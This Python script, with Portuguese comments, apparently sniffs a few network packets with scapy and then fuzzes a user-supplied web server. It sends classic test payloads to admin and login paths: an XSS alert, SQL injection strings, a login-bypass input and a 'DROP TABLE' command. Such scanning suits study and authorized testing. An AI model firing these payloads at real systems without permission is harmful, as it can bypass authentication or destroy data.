from scapy.all import *
import requests
import random
import string
import json
from datetime import datetime


def gerar_variacoes():
    entradas = [
        ''.join(random.choices(string.ascii_letters + string.digits, k=50)),  # Texto grande aleatório
        '<script>alert("Falha XSS")</script>',  #xss
        "' OR 1=1 --",  #injeção sql
        "; DROP TABLE usuarios;",  #sql deletar tabelas
        "admin' OR '1'='1",  #burlar autenticacao
    ]
    return entradas


def testar_enderecos(url_base, caminhos, variacoes):
    vulnerabilidades = []
    print("xxx iniciando testes xxx")
    for caminho in caminhos:
        for variacao in variacoes:
            url = f"{url_base}/{caminho}?q={variacao}"
            try:
                resposta = requests.get(url, timeout=5)
                print(f"testando {url} -  HTTP: {resposta.status_code}")

                if resposta.status_code >= 500 or "erro" in resposta.text.lower():
                    vulnerabilidades.append({
                        "url": url,
                        "entrada_usada": variacao,
                        "codigo_http": resposta.status_code,
                        "tamanho_resposta": len(resposta.text)
                    })
            except requests.exceptions.RequestException as e:
                print(f"erro ao acessar {url}: {e}")
                vulnerabilidades.append({
                    "url": url,
                    "entrada_usada": variacao,
                    "erro": str(e)
                })
    return vulnerabilidades


def capturar_pacotes_http(interface):
    print("xxx Observando pacotes HTTP na interface:", interface)
    sniff(iface=interface, filter="tcp port 80 or tcp port 443", prn=processar_pacote, count=20)


def processar_pacote(pacote):

    if pacote.haslayer(IP):
        ip_origem = pacote[IP].src
        ip_destino = pacote[IP].dst
        print(f"xxx Pacote capturado: {ip_origem} => {ip_destino}")


def salvar_resultados(arquivo_dados, nome_arquivo="resultados.json"):
    with open(nome_arquivo, "w") as arquivo:
        json.dump(arquivo_dados, arquivo, indent=4)
    print(f"xxx resultados salvos em {nome_arquivo}")


if __name__ == "__main__":
    interfaces = get_if_list()
    print("xxx interfaces :", interfaces)
    interface = input("entre com o nome da interface que deseja monitorar: ")

    capturar_pacotes_http(interface)

    url_base = input("qual a url base do servidor para os testes: ")
    caminhos = ["admin", "login", "teste", "configuracao"]
    variacoes = gerar_variacoes()
    vulnerabilidades = testar_enderecos(url_base, caminhos, variacoes)

    print("xxx enderecos vulneraveis detectados:")
    for falha in vulnerabilidades:
        print(
            f"URL: {falha['url']} - Entrada usada: {falha['entrada_usada']} - Código HTTP: {falha.get('codigo_http', 'Erro')}")

    salvar_resultados(vulnerabilidades)
